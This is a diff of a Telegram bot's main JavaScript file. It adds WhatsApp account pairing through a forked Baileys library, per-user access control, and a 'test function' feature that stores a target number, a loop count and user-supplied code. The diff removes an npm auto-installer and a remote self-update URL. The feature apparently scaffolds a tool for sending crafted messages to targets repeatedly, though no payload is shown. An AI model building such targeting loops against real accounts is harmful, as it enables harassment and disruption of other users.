@@ -1,136 +1,77 @@
 const { Telegraf } = require('telegraf');
 const fs = require('fs-extra');
+process.on(
+    "unhandledRejection",
+    err => {
+
+        console.log(
+            "UNHANDLED:",
+            err
+        )
+
+    }
+)
+
+process.on(
+    "uncaughtException",
+    err => {
+
+        console.log(
+            "UNCAUGHT:",
+            err
+        )
+
+    }
+)
+const axios = require('axios');
+const vm = require('vm');
+const path = require('path');
+const pino = require('pino');
+const chalk = require('chalk');
 const archiver  = require("archiver")
 const chokidar  = require("chokidar")
-const crypto = require('crypto');
-const { execSync } = require("child_process")
-
-function escapeHtml(text = "") {
-    return text
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-}
-
-function autoInstall(moduleName) {
-
-    try {
-
-        // cek module
-        require.resolve(moduleName)
-
-        console.log(
-            `MODULE ${moduleName} sudah terinstall`
-        )
-
-    } catch {
-
-        console.log(
-            `INSTALL installing ${moduleName}...`
-        )
-
-        try {
-
-            execSync(
-                `npm install ${moduleName}`,
-                {
-                    stdio: "inherit"
-                }
-            )
-
-            console.log(
-                `SUCCESS ${moduleName} berhasil diinstall`
-            )
-
-        } catch (err) {
-
-            console.log(
-                `PROSES INSTALL ${moduleName}`
-            )
-
-            console.log(
-                err.message
-            )
-        }
-    }
-}
-
-// =============================
-// AUTO INSTALL LIST
-// =============================
-const modules = [
-
-    "crypto",
-    "axios",
-    "fs-extra",
-    "grammy",
-    "moment-timezone",
-    "path",
-    "chokidar",
-    "archiver@5.3.1",
-    "acorn",
-    "os",
-    "vm",
-    "http",
-    "https"
-
-]
-
-// =============================
-// RUN AUTO INSTALL
-// =============================
-for (const mod of modules) {
-
-    autoInstall(mod)
-}
-const axios = require('axios')
-const os = require('os')
-const https = require("https")
-const http = require("http")
-const vm = require('vm')
-const acorn = require('acorn')
-const path = require('path')
-const { Bot, InputFile } = require('grammy')
-const moment = require("moment-timezone")
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  DisconnectReason,
+  generateWAMessageFromContent,
+  generateForwardMessageContent,
+  prepareWAMessageMedia,
+  proto,
+  jidDecode,
+  areJidsSameUser,
+} = require("@bellachu/baileys")
 const config = require('./config');
 const updater = require("./updater");
+const updateLink = require("./updatelink");
 
-// helper euyy
-const PATH_MAINTENANCE = "./database/maintenance.json"
-
-// =============================
-// CREATE FILE
-// =============================
-if (!fs.existsSync(PATH_MAINTENANCE)) {
-
-    fs.writeFileSync(
-        PATH_MAINTENANCE,
-        JSON.stringify({
-            status: false,
-            reason: "-"
-        }, null, 2)
-    )
-}
-
-// helper baca status maintenance
-function isMaintenance() {
-    try {
-        const data = JSON.parse(
-            fs.readFileSync(PATH_MAINTENANCE, "utf8")
-        )
-        return data.status === true
-    } catch {
-        return false
-    }
-}
+console.clear()
+console.log(chalk.green(`
+▀█▀ █░█ █▀ ░█▀▄ █▀▀▄ ▄▀▄ ▀█▀ ▄▀▄ ▀█▀ █░█ █▀▄ █▀
+░█░ █▀█ █▀ ░█▄█ █▐█▀ █░█ ░█░ █░█ ░█░ ▀▄▀ █▄█ █▀
+░▀░ ▀░▀ ▀▀ ░▀░░ ▀░▀▀ ░▀░ ░▀░ ░▀░ ░▀░ ░▀░ ▀░░ ▀▀
+`));
+console.log(chalk.cyan(`🔥 THE PROTOTYPE ZERO 🔥
+👑 𝖮𝗐𝗇𝖾𝗋    : @SabilOfficial
+🌐 𝖵𝖾𝗋𝗌𝗂𝗈𝗇   : 𝟣 Gen 𝟤
+🚧 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾 : JavaScript / 𝖩𝖲
+🤖 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖡𝗈𝗍 Acctive`));
+const bot = new Telegraf(config.BOT_TOKEN);
+const CHAT_SESSION = {}
+const REPLY_MAP = {}
+const WAITING_UPDATE_LINK = {}
+const UPDATE_FLAG = "./update.flag"
+// ==================== SESSION PER USER ====================
+const userSessions = new Map(); // userId -> Map of senderKey -> sock
+const senderStatus = new Map(); // senderKey -> status online
+const waitingForConnect = new Map(); // userId -> waiting for number
+const waitingForTestFunc = new Map(); // userId -> { target, loop, funcCode }
 
 // Backup Files Jirr
-const BACKUP_OWNER_ID = 8937589616
+const BACKUP_OWNER_ID = config.OWNER_ID
 
 const BACKUP_DIR =
 path.join(__dirname, "backup")
-
-
 
 // =============================
 // CREATE BACKUP DIR
@@ -144,265 +85,71 @@ if (!fs.existsSync(BACKUP_DIR)) {
         }
     )
 }
+// ==================== DATABASE AKSES USER ====================
+const ACCESS_FILE = './akses.json';
 
-const UPDATE_URL =
-"https://raw.githubusercontent.com/SabilOfficial-dev/SabilNotDev/main/message.js"
+function loadAkses() {
+    if (!fs.existsSync(ACCESS_FILE)) fs.writeJsonSync(ACCESS_FILE, { users: {} });
+    return fs.readJsonSync(ACCESS_FILE);
+}
+function saveAkses(data) { fs.writeJsonSync(ACCESS_FILE, data, { spaces: 2 }); }
+function isUserHasAccess(userId) {
+    const data = loadAkses();
+    return data.users[userId] === true;
+}
+function setUserAccess(userId, hasAccess) {
+    const data = loadAkses();
+    if (hasAccess) data.users[userId] = true;
+    else delete data.users[userId];
+    saveAkses(data);
+}
 
-const LOCAL_FILE = "./index.js"
-
-const UPDATE_FLAG =
-"./update.flag"
-
-// Func
-const pause = (ms) => new Promise(resolve => setTimeout(resolve, ms))
-
-const E = {
-  bot: `<tg-emoji emoji-id='5987802868734760945'>✨</tg-emoji>`,
-  botStar: `<tg-emoji emoji-id='4956232383721374836'>✨</tg-emoji>`,
-  dev: `<tg-emoji emoji-id='5879770735999717115'>✨</tg-emoji>`,
-  doc: `<tg-emoji emoji-id='5839380580080293813'>✨</tg-emoji>`,
-  dot: `<tg-emoji emoji-id='5832251986635920010'>✨</tg-emoji>`,
-  duration: `<tg-emoji emoji-id='5776213190387961618'>✨</tg-emoji>`,
-  emoFree: `<tg-emoji emoji-id='5368324170671202286'>✨</tg-emoji>`,
-  err: `<tg-emoji emoji-id='5886496611835581345'>✨</tg-emoji>`,
-  games: `<tg-emoji emoji-id='4958903389523018769'>✨</tg-emoji>`,
-  group: `<tg-emoji emoji-id='5879896690210639947'>✨</tg-emoji>`,
-  grp: `<tg-emoji emoji-id='5983399041197675256'>✨</tg-emoji>`,
-  id: `<tg-emoji emoji-id='5819078828017849357'>✨</tg-emoji>`,
-  info2: `<tg-emoji emoji-id='5886440807325504167'>✨</tg-emoji>`,
-  key: `<tg-emoji emoji-id='5877307202888273539'>✨</tg-emoji>`,
-  link: `<tg-emoji emoji-id='5796440171364749940'>✨</tg-emoji>`,
-  mute: `<tg-emoji emoji-id='5771511103141975115'>✨</tg-emoji>`,
-  name: `<tg-emoji emoji-id='5883964170268840032'>✨</tg-emoji>`,
-  ok: `<tg-emoji emoji-id='6296501388276926215'>✨</tg-emoji>`,
-  set: `<tg-emoji emoji-id='5886707481844912001'>✨</tg-emoji>`,
-  shield: `<tg-emoji emoji-id='5843862283964390528'>✨</tg-emoji>`,
-  status: `<tg-emoji emoji-id='5839354140261619193'>✨</tg-emoji>`,
-  tools: `<tg-emoji emoji-id='5924720918826848520'>✨</tg-emoji>`,
-  total: `<tg-emoji emoji-id='5888799736508454231'>✨</tg-emoji>`,
-  user: `<tg-emoji emoji-id='5920344347152224466'>✨</tg-emoji>`,
-  version: `<tg-emoji emoji-id='5956561749070057536'>✨</tg-emoji>`,
-  warn: `<tg-emoji emoji-id='5881702736843511327'>✨</tg-emoji>`,
-  warnInfo: `<tg-emoji emoji-id='5954175920506933873'>✨</tg-emoji>`,
-
-  alasan: `<tg-emoji emoji-id='5839380580080293813'>📝</tg-emoji>`,
-  cantik: `<tg-emoji emoji-id='6296501388276926215'>💄</tg-emoji>`,
-  casino: `<tg-emoji emoji-id='4958903389523018769'>🎰</tg-emoji>`,
-  crown: `<tg-emoji emoji-id='5881702736843511327'>👑</tg-emoji>`,
-  game: `<tg-emoji emoji-id='4958903389523018769'>🎮</tg-emoji>`,
-  green: `<tg-emoji emoji-id='6296501388276926215'>🟢</tg-emoji>`,
-  jackpot: `<tg-emoji emoji-id='6296501388276926215'>🎉</tg-emoji>`,
-  kaya: `<tg-emoji emoji-id='6296501388276926215'>💵</tg-emoji>`,
-  khodam: `<tg-emoji emoji-id='5987802868734760945'>🔮</tg-emoji>`,
-  label: `<tg-emoji emoji-id='5886440807325504167'>🏷️</tg-emoji>`,
-  lilin: `<tg-emoji emoji-id='5839354140261619193'>🕯️</tg-emoji>`,
-  lock: `<tg-emoji emoji-id='5886496611835581345'>🔒</tg-emoji>`,
-  miskin: `<tg-emoji emoji-id='6296501388276926215'>💸</tg-emoji>`,
-  namebadge: `<tg-emoji emoji-id='5883964170268840032'>📛</tg-emoji>`,
-  pantun: `<tg-emoji emoji-id='5839380580080293813'>📜</tg-emoji>`,
-  red: `<tg-emoji emoji-id='5886496611835581345'>🔴</tg-emoji>`,
-  sad: `<tg-emoji emoji-id='5886496611835581345'>😢</tg-emoji>`,
-  spek: `<tg-emoji emoji-id='5883964170268840032'>📊</tg-emoji>`,
-  star2: `<tg-emoji emoji-id='5881702736843511327'>⭐</tg-emoji>`,
-  tampan: `<tg-emoji emoji-id='6296501388276926215'>🪞</tg-emoji>`,
-  tolol: `<tg-emoji emoji-id='5987802868734760945'>🧠</tg-emoji>`,
-  ukur: `<tg-emoji emoji-id='5839380580080293813'>📐</tg-emoji>`,
-  umur: `<tg-emoji emoji-id='5839354140261619193'>🎂</tg-emoji>`,
-  unlock: `<tg-emoji emoji-id='6296501388276926215'>🔓</tg-emoji>`,
-};
-
-const esc = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
-
-function analyseCode(code) {
-  let errorMsg   = ""
-  let errorLine  = null
-  let errorCol   = null
-  let fixSuggest = ""
-
-  try {
-    new Function(code) // eslint-disable-line no-new-func
-  } catch (e) {
-    errorMsg = e.message
-    const msg = e.message
-
-    let m = msg.match(/line (\d+)/i)
-    if (m) errorLine = parseInt(m[1])
-
-    if (!errorLine) {
-      m = (e.stack || "").match(/<anonymous>:(\d+):(\d+)/)
-      if (m) { errorLine = parseInt(m[1]) - 2; errorCol = parseInt(m[2]) }
+// ==================== CEK JOIN CHANNEL ====================
+async function isUserJoinedChannel(userId) {
+    try {
+        if (!config.CHANNEL_USERNAME || config.CHANNEL_USERNAME === "namachannel") return true;
+        const channelUsername = config.CHANNEL_USERNAME.replace('@', '');
+        const chatMember = await bot.telegram.getChatMember(`@${channelUsername}`, userId);
+        return ['creator', 'administrator', 'member', 'restricted'].includes(chatMember.status);
+    } catch (err) {
+        return true;
     }
-
-    if      (/unexpected token 'else'/i.test(msg))       fixSuggest = "Ada blok `if` tidak lengkap atau kurung kurawal `{}` hilang sebelum `else`."
-    else if (/unexpected token/i.test(msg))              fixSuggest = "Periksa tanda kurung `()`, kurawal `{}`, siku `[]`, atau titik koma `;` yang hilang/salah posisi."
-    else if (/is not defined/i.test(msg))                fixSuggest = "Variabel/fungsi belum dideklarasikan. Tambahkan `const/let/var` atau pastikan sudah di-import."
-    else if (/cannot read propert/i.test(msg))           fixSuggest = "Objek bernilai null/undefined. Gunakan optional chaining `?.` atau cek nilai terlebih dahulu."
-    else if (/await is only valid/i.test(msg))           fixSuggest = "`await` hanya valid di dalam `async function`. Bungkus kode dengan `async function() {}`."
-    else if (/missing \) after/i.test(msg))              fixSuggest = "Tanda kurung `()` tidak ditutup dengan benar."
-    else if (/missing } after/i.test(msg))               fixSuggest = "Kurung kurawal `{}` tidak ditutup. Cek penutupan function/object/class."
-    else if (/invalid or unexpected/i.test(msg))         fixSuggest = "Token tidak valid di posisi ini. Cek sintaks di sekitar baris error."
-    else if (/assignment to constant/i.test(msg))        fixSuggest = "Tidak bisa mengubah nilai `const`. Ganti dengan `let` jika perlu re-assign."
-    else if (/duplicate parameter/i.test(msg))           fixSuggest = "Ada parameter yang sama dalam function. Ganti nama parameter yang duplikat."
-    else if (/identifier.*already.*declared/i.test(msg)) fixSuggest = "Nama variabel sudah dipakai di scope yang sama. Ganti nama atau hapus deklarasi duplikat."
-    else if (/cannot use.*before.*init/i.test(msg))      fixSuggest = "Variabel dipakai sebelum dideklarasikan (temporal dead zone). Pindahkan deklarasi ke atas."
-    else if (/unexpected end of input/i.test(msg))       fixSuggest = "Kode belum selesai. Ada kurung atau string yang tidak ditutup di bagian akhir."
-    else if (/octal.*strict/i.test(msg))                 fixSuggest = "Literal oktal tidak diizinkan di strict mode. Hapus angka 0 di depan atau gunakan 0o prefix."
-    else                                                 fixSuggest = "Periksa sintaks dan logika di sekitar baris yang ditunjuk."
-  }
-
-  const annotated = code.split("\n").map((ln, idx) => {
-    const no    = String(idx + 1).padStart(4, " ")
-    const isErr = errorLine && idx + 1 === errorLine
-    return isErr
-      ? `${no} | >>>  ${ln}${errorCol ? `   ← ERROR col ${errorCol}` : "   ← ERROR DI SINI"}`
-      : `${no} |     ${ln}`
-  }).join("\n")
-
-  return { errorMsg, errorLine, errorCol, fixSuggest, annotated, hasError: !!errorMsg }
 }
 
-async function downloadTgFile(telegram, fileId) {
-
-    const file =
-    await telegram.getFile(fileId)
-
-    const url =
-    `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-    return new Promise((resolve, reject) => {
-
-        https.get(url, (res) => {
-
-            const chunks = []
-
-            res.on("data", d =>
-                chunks.push(d)
-            )
-
-            res.on("end", () =>
-                resolve(
-                    Buffer.concat(chunks)
-                    .toString("utf8")
-                )
-            )
-
-            res.on("error", reject)
-
-        }).on("error", reject)
-
-    })
+// ==================== PATH SESSION ====================
+const SESSIONS_DIR = './wa_sessions';
+if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
+function sessionPath(senderKey) {
+    return path.join(SESSIONS_DIR, senderKey);
 }
 
-function renderAnnotated(code, errLine) {
-  return code.split("\n").map((ln, idx) => {
-    const no = String(idx + 1).padStart(4, " ")
-    return errLine && idx + 1 === errLine
-      ? `${no} | >>>  ${ln}   ← ERROR`
-      : `${no} |     ${ln}`
-  }).join("\n")
+// ==================== FILE AKTIF ====================
+const FILE_ACTIVE = './active_senders.json';
+function loadActiveSenders() {
+    if (fs.existsSync(FILE_ACTIVE)) return fs.readJsonSync(FILE_ACTIVE);
+    return [];
 }
-
-function cleanCode(code) {
-  const lines  = code.split("\n")
-  let   indent = 0
-  const STEP   = 2
-  const out    = []
-
-  for (const raw of lines) {
-    const content = raw.trimEnd().trimStart()
-    if (!content) { out.push(""); continue }
-
-    if (/^[}\])]/.test(content)) indent = Math.max(0, indent - STEP)
-    out.push(" ".repeat(indent) + content)
-
-    const stripped = content.replace(/\/\/.*$/, "").replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`/g, "").trimEnd()
-    const op = (stripped.match(/[{[(]/g) || []).length
-    const cl = (stripped.match(/[}\])]/g) || []).length
-    if (op > cl) indent += STEP
-  }
-
-  return out.join("\n").replace(/\n{3,}/g, "\n\n").trim()
-}
-
-function tryAutoFix(code) {
-let fixed    = code
-  let fixNotes = []
-
-  // Pass 1 — await di luar async
-  if (/\bawait\b/.test(fixed) && !/async\s*(function|\()/.test(fixed)) {
-    fixed = `async function _autoWrapper() {\n${fixed}\n}\n_autoWrapper().catch(console.error)`
-    fixNotes.push("Membungkus dalam async function (await di luar async)")
-  }
-  let r = analyseCode(fixed)
-  if (!r.hasError) return { fixed, fixNotes, result: r }
-
-  // Pass 2 — missing semicolons
-  const pass2 = fixed.split("\n").map(ln => {
-    const tr = ln.trimEnd()
-    if (
-      /^(const|let|var|return|throw|break|continue)\b/.test(tr.trim()) &&
-      !tr.endsWith(";") && !tr.endsWith("{") && !tr.endsWith("}") &&
-      !tr.endsWith(",") && !tr.startsWith("//") && !tr.startsWith("*")
-    ) return tr + ";"
-    return ln
-  }).join("\n")
-  r = analyseCode(pass2)
-  if (!r.hasError) { fixed = pass2; fixNotes.push("Menambahkan semicolon yang hilang"); return { fixed, fixNotes, result: r } }
-
-  // Pass 3 — tutup kurung kurawal
-  const opens3  = (fixed.match(/\{/g) || []).length
-  const closes3 = (fixed.match(/\}/g) || []).length
-  if (opens3 > closes3) {
-    fixed += "\n" + "}".repeat(opens3 - closes3)
-    fixNotes.push(`Menambahkan ${opens3 - closes3} kurung kurawal penutup`)
-    r = analyseCode(fixed)
-    if (!r.hasError) return { fixed, fixNotes, result: r }
-  }
-
-  // Pass 4 — tutup tanda kurung biasa
-  const openP  = (fixed.match(/\(/g) || []).length
-  const closeP = (fixed.match(/\)/g) || []).length
-  if (openP > closeP) {
-    fixed += ")".repeat(openP - closeP)
-    fixNotes.push(`Menutup ${openP - closeP} tanda kurung`)
-    r = analyseCode(fixed)
-    if (!r.hasError) return { fixed, fixNotes, result: r }
-  }
-
-  // Pass 5 — tutup kurung siku
-  const openB  = (fixed.match(/\[/g) || []).length
-  const closeB = (fixed.match(/\]/g) || []).length
-  if (openB > closeB) {
-    fixed += "]".repeat(openB - closeB)
-    fixNotes.push(`Menutup ${openB - closeB} kurung siku`)
-    r = analyseCode(fixed)
-    if (!r.hasError) return { fixed, fixNotes, result: r }
-  }
-
-  // Pass 6 — hapus baris error dan coba lagi
-  if (r.errorLine) {
-    const lines6  = fixed.split("\n")
-    const errIdx  = r.errorLine - 1
-    const removed = lines6.splice(errIdx, 1)[0]
-    const after6  = lines6.join("\n")
-    const r6      = analyseCode(after6)
-    if (!r6.hasError) {
-      fixed = after6
-      fixNotes.push(`Menghapus baris ${r.errorLine} penyebab error: "${removed.trim()}"`)
-      return { fixed, fixNotes, result: r6 }
+function saveActiveSenders(data) { fs.writeJsonSync(FILE_ACTIVE, data, { spaces: 2 }); }
+function addActiveSender(senderKey, userId) {
+    const data = loadActiveSenders();
+    if (!data.find(s => s.sender === senderKey)) {
+        data.push({ sender: senderKey, userId });
+        saveActiveSenders(data);
     }
-  }
-
-  return { fixed, fixNotes, result: r }
+}
+function removeActiveSender(senderKey) {
+    const data = loadActiveSenders().filter(s => s.sender !== senderKey);
+    saveActiveSenders(data);
 }
 
+// ==================== GET RUNTIME ====================
 function formatRuntime(seconds) {
   const days = Math.floor(seconds / (3600 * 24));
   const hours = Math.floor((seconds % (3600 * 24)) / 3600);
   const minutes = Math.floor((seconds % 3600) / 60);
   const secs = seconds % 60;
 
-  return `${days}D, ${hours}H, ${minutes}M, ${secs}S`
+  return `${days}ᴅ, ${hours}ʜ, ${minutes}ᴍ, ${secs}s`
 }
 
 const startTime = Math.floor(Date.now() / 1000);
@@ -412,1383 +159,900 @@ function getBotRuntime() {
   return formatRuntime(now - startTime);
 }
 
-async function checkUpdateFlag() {
-try {
+// ==================== GET MEMORY ====================
+function getMemoryUsage() {
+    const used = process.memoryUsage().heapUsed / 1024 / 1024;
+    return `${Math.round(used)} MB`;
+}
 
-    if (
-        !fs.existsSync(
-            "./update.flag"
+// ==================== ESCAPE HTML ====================
+function esc(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m]));
+}
+
+// ==================== SLEEP ====================
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+// ==================== DOWNLOAD FILE TELEGRAM ====================
+async function downloadTgFile(telegram, fileId) {
+    const file = await telegram.getFile(fileId);
+    const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;
+    const response = await axios.get(fileUrl, { responseType: 'text' });
+    return response.data;
+}
+
+// ==================== CEK SYNTAX ERROR DENGAN ACORN ====================
+function analyseCode(code) {
+    try {
+        acorn.parse(code, { ecmaVersion: 2022, sourceType: 'module' });
+        return {
+            hasError: false,
+            errorMsg: null,
+            errorLine: null,
+            fixSuggest: null,
+            annotated: null
+        };
+    } catch (err) {
+        const errorLine = err.loc?.line || '?';
+        const errorColumn = err.loc?.column || '?';
+        const errorMsg = err.message;
+        
+        // Ambil cuplikan kode di sekitar error
+        const lines = code.split('\n');
+        const startLine = Math.max(0, errorLine - 3);
+        const endLine = Math.min(lines.length, errorLine + 2);
+        let annotated = '';
+        for (let i = startLine; i < endLine; i++) {
+            const lineNum = i + 1;
+            const prefix = lineNum === errorLine ? '👉 ' : '   ';
+            annotated += `${prefix}${lineNum}: ${lines[i]}\n`;
+            if (lineNum === errorLine) {
+                annotated += `      ${' '.repeat(errorColumn - 1)}^\n`;
+            }
+        }
+        
+        // Saran perbaikan berdasarkan error
+        let fixSuggest = '';
+        if (errorMsg.includes('Unexpected token')) {
+            fixSuggest = 'Periksa tanda kurung, kurung kurawal, atau titik koma yang mungkin kurang/berlebih.';
+        } else if (errorMsg.includes('Unexpected end of input')) {
+            fixSuggest = 'Ada kurung buka atau kurung kurawal yang tidak ditutup. Periksa pasangan { } ( ) [ ]';
+        } else if (errorMsg.includes('Identifier')) {
+            fixSuggest = 'Cek nama variabel atau fungsi. Mungkin menggunakan kata kunci reserved.';
+        } else if (errorMsg.includes('string')) {
+            fixSuggest = 'Cek string yang tidak ditutup dengan benar (kutip atau petik dua).';
+        } else {
+            fixSuggest = 'Periksa kode di sekitar baris error. Mungkin ada sintaks yang salah.';
+        }
+        
+        return {
+            hasError: true,
+            errorMsg: errorMsg,
+            errorLine: errorLine,
+            fixSuggest: fixSuggest,
+            annotated: annotated
+        };
+    }
+}
+
+// ==================== CREATE SAFE SOCK ====================
+function createSafeSock(sock) {
+    return new Proxy(sock, {
+        get(target, prop) {
+            if (typeof target[prop] === 'function') {
+                return async (...args) => {
+                    try {
+                        return await target[prop](...args);
+                    } catch (err) {
+                        console.error(`[SafeSock] Error in ${prop}:`, err.message);
+                        throw err;
+                    }
+                };
+            }
+            return target[prop];
+        }
+    });
+}
+
+// ==================== HANDLE WA MESSAGE ====================
+async function handleWAMsg(sock, msg, senderKey) {
+    console.log(chalk.red(`📩 WA Message from ${senderKey}:`, msg.key.remoteJid));
+}
+
+function attachWAHandler(sock, senderKey) {
+    sock.ev.on("messages.upsert", async ({ messages, type }) => {
+        if (type !== "notify") return;
+        for (const msg of messages) {
+            if (!msg.message || msg.key.fromMe) continue;
+            try {
+                await handleWAMsg(sock, msg, senderKey);
+            } catch (e) {
+                console.error(`WA[${senderKey}] error:`, e.message);
+            }
+        }
+    });
+}
+
+// ==================== KONEKSI SINGLE (RESTORE) ====================
+async function connectSingle(senderKey, userId) {
+    const dir = sessionPath(senderKey);
+    const { state, saveCreds } = await useMultiFileAuthState(dir);
+    const sock = makeWASocket({
+        auth: state,
+        printQRInTerminal: false,
+        logger: pino({ level: "silent" }),
+        defaultQueryTimeoutMs: undefined
+    });
+
+    if (!userSessions.has(userId)) userSessions.set(userId, new Map());
+    userSessions.get(userId).set(senderKey, sock);
+    senderStatus.set(senderKey, false);
+
+    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+        if (connection === "open") {
+            senderStatus.set(senderKey, true);
+            addActiveSender(senderKey, userId);
+            console.log(chalk.green(`
+Infotmation
+Status : ✅ Whatsapp Connect
+Number : ${senderKey} 
+Users : (user: ${userId})`));
+        }
+        if (connection === "close") {
+            senderStatus.set(senderKey, false);
+            userSessions.get(userId)?.delete(senderKey);
+            const code = lastDisconnect?.error?.output?.statusCode;
+            if (code !== DisconnectReason.loggedOut) {
+                console.log(`🔄 WA Reconnecting · ${senderKey}`);
+                setTimeout(() => connectSingle(senderKey, userId), 4000);
+            } else {
+                console.log(`❌ WA Logged Out · ${senderKey}`);
+                senderStatus.delete(senderKey);
+                removeActiveSender(senderKey);
+            }
+        }
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+    attachWAHandler(sock, senderKey);
+    return sock;
+}
+
+// ==================== KONEKSI BARU (PAIRING) ====================
+async function connectNew(senderKey, userId, chatId, telegram) {
+    const dir = sessionPath(senderKey);
+    const { state, saveCreds } = await useMultiFileAuthState(dir);
+
+    const statusMsg = await telegram.sendMessage(chatId,
+        `<blockquote><b>⏳ Memulai pairing untuk</b>${senderKey}...\nHarap tunggu...</blockquote>`,
+        { parse_mode: "HTML" });
+    const msgId = statusMsg.message_id;
+    const edit = text => telegram.editMessageText(chatId, msgId, null, text, { parse_mode: "HTML" }).catch(() => {});
+
+    const sock = makeWASocket({
+        auth: state,
+        printQRInTerminal: false,
+        logger: pino({ level: "silent" }),
+        defaultQueryTimeoutMs: undefined,
+        // Support WhatsApp Business
+        version: [2, 2341, 10]
+    });
+
+    if (!userSessions.has(userId)) userSessions.set(userId, new Map());
+    userSessions.get(userId).set(senderKey, sock);
+    senderStatus.set(senderKey, false);
+
+    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+        if (connection === "connecting") {
+            await sleep(1500);
+            try {
+                const credsFile = path.join(dir, "creds.json");
+                if (!fs.existsSync(credsFile)) {
+                    const raw = await sock.requestPairingCode(senderKey);
+                    const code = raw.match(/.{1,4}/g)?.join("-") || raw;
+                    await edit(
+                        `
+<blockquote><b>🔐 Pairing WhatsApp</b></blockquote>
+<blockquote><b>📱 Nomor</b> : <code>${senderKey}</code>
+<b>🔢 Kode</b>  : <code>${code}</code></blockquote>
+<blockquote><b>📌 Langkah:</b>
+1. Buka WhatsApp/WhatsApp Business
+2. ⋮ → Perangkat Tertaut
+3. Tautkan Perangkat
+4. Masukkan kode di atas</blockquote>
+<i>Kode berlaku beberapa menit</i>`);
+                }
+            } catch (e) {
+                await edit(`<blockquote>❗ Gagal generate kode\n\n<code>${e.message}</code>\n\nCoba lagi nanti.</blockquote>`);
+            }
+        }
+
+        if (connection === "open") {
+            senderStatus.set(senderKey, true);
+            addActiveSender(senderKey, userId);
+            await edit(`
+<blockquote>
+█▀ █▀█ █▄░█ █▄░█ █▀▀ █▀ ▀█▀
+█▄ █▄█ █░▀█ █░▀█ ██▄ █▄ ░█░</blockquote>\n\n<blockquote>📱 Nomor: <code>${senderKey}</code>\n✅ Status: Online</blockquote>`);
+            console.log(chalk.cyan(`
+             Infotmation
+             Status : ✅ Whatsapp Connect
+             Number : ${senderKey} 
+             Users : (user: ${userId})`));
+            attachWAHandler(sock, senderKey);
+        }
+
+        if (connection === "close") {
+            senderStatus.set(senderKey, false);
+            const code = lastDisconnect?.error?.output?.statusCode;
+            if (code >= 500 && code < 600) {
+                userSessions.get(userId)?.delete(senderKey);
+                await edit(`<blockquote>⏳ Menghubungkan ulang <code>${senderKey}</code></blockquote>`);
+                return connectNew(senderKey, userId, chatId, telegram);
+            }
+            await edit(`
+<blockquote>
+█▀▀ ▄▀█ █▀▀ ▄▀█ █░
+█▄█ █▀█ █▄█ █▀█ █▄</blockquote>\n\n<blockquote>📱 Nomor: <code>${senderKey}</code>\n⚠️ Sesi tidak valid\n\nCoba /connect ${senderKey}</blockquote>`);
+            userSessions.get(userId)?.delete(senderKey);
+            senderStatus.delete(senderKey);
+            removeActiveSender(senderKey);
+            try { fs.rmSync(dir, { recursive: true, force: true }); } catch (e) {}
+        }
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+    return sock;
+}
+
+// ==================== FUNCTION ====================
+async function checkJoin(userId) {
+    try {
+        const member = await bot.telegram.getChatMember(
+            config.CHANNEL_USERNAME,
+            userId
+        );
+
+        const validStatus = [
+            "creator",
+            "administrator",
+            "member"
+        ];
+
+        return validStatus.includes(member.status);
+    } catch (err) {
+        console.error('Check join error:', err.message);
+        return false;
+    }
+}
+
+// ==================== FUNCTION 2: MIDDLEWARE ONLY JOIN CHANNEL ====================
+const onlyJoinChannel = async (ctx, next) => {
+    const userId = ctx.from?.id;
+
+    // Safety check
+    if (!userId) return ctx.reply("❌ User tidak valid.");
+
+    // Owner bypass
+    if (userId === config.OWNER_ID) {
+        return next();
+    }
+
+    try {
+        const isJoined = await checkJoin(userId);
+
+        if (!isJoined) {
+            return ctx.reply(
+                "🔐 Kamu harus join channel terlebih dahulu sebelum menggunakan.",
+                {
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "✔ 𝖲𝗎𝖽𝖺𝗁 𝖩𝗈𝗂𝗇",
+                                    callback_data: "check_join",
+                                    style: "danger"
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+        }
+
+        return next();
+    } catch (err) {
+        console.error("Join check error:", err);
+        return ctx.reply("❌ Gagal mengecek status channel.");
+    }
+};
+
+// Keyboard tempe
+const keyboard1 = {
+    inline_keyboard: [
+        [
+          { text: "🧸 𝚃𝙴𝚂𝚃 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 🧸", callback_data: "test_func", style: "success" },
+          { text: "⚙️ 𝚃𝚄𝚃𝙾𝚁𝙸𝙰𝙻 ⚙️", callback_data: "tutor_menu", style: "success" }
+        ],
+        [
+          { text: "🔔 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 🔔", url: "t.me/aboutbil", style: "primary" },
+          { text: "👑 𝙾𝚆𝙽𝙴𝚁 👑", url: "t.me/sabilofficial", style: "primary" }
+        ]
+      ]
+   };
+   
+const keyboard2 = {
+    inline_keyboard: [
+        [
+          { text: "⪨ 𝙱𝙰𝙲𝙺", callback_data: "main_menu", style: "success" }
+        ],
+        [
+          { text: "🔔 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 🔔", url: "t.me/aboutbil", style: "primary" },
+          { text: "👑 𝙾𝚆𝙽𝙴𝚁 👑", url: "t.me/sabilofficial", style: "primary" }
+        ]
+     ]
+  };
+        
+
+
+// ==================== KIRIM DENGAN THUMBNAIL ====================
+async function sendWithThumbnail(ctx, text, extra = {}) {
+    try {
+        if (config.THUMBNAIL_URL && config.THUMBNAIL_URL.startsWith('http')) {
